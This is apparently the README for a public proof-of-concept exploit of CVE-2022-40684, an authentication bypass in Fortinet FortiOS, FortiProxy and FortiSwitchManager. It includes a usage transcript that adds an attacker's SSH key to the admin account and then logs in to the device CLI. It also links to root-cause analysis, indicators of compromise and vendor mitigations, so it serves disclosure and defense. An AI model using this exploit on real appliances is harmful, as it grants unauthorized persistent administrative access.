# CVE-2022-40684
POC for CVE-2022-40684 affecting Fortinet FortiOS, FortiProxy, and FortiSwitchManager appliances.

## Technical Analysis
A technical root cause analysis of the vulnerability can be found on our blog:
https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684

## Indicators of Compromise
For analyizing Fortinet logs for indicators of compromise and how to enable deeper logs check out our IOC blog:
https://www.horizon3.ai/fortinet-iocs-cve-2022-40684/

## Summary
This POC abuses the authentication bypass vulnerability to set an SSH key for the specified user.

## Usage
```plaintext
root@kali:~# python3 CVE-2022-40684.py -t 10.0.40.67 --username admin --key-file ~/.ssh/id_rsa.pub
[+] SSH key for admin added successfully!
root@kali:~# ssh admin@10.0.40.67
fortios_7_2_1 # 
config      Configure object.
get         Get dynamic and system information.
show        Show configuration.
diagnose    Diagnose facility.
execute     Execute static commands.
alias       Execute alias commands.
exit        Exit the CLI.
```

## Mitigations
Update to the latest version or mitigate by following the instructions within the Fortinet PSIRT
* https://www.fortiguard.com/psirt/FG-IR-22-377

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

